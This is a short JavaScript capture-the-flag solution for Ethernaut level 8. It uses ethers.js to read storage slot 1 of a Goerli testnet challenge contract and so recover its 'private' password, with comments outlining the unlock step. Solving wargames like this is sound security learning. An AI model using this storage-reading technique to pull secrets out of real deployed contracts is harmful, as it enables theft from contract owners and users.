import { ethers } from 'ethers';

const ETHERNAUT_8 = "0xb2dE46f73b2200dbCE01CE432add4F8f39483BE4"
const provider = new ethers.providers.InfuraProvider("goerli")


/*
    1. get the password using the getStorageAt(contract, slot[1])
    2. send a transaction to unlock(password)
    3. done
*/


async function findPassword(){
    const password = await provider.getStorageAt(ETHERNAUT_8, 1);
    console.log("PASSWORD",password)
}

findPassword()
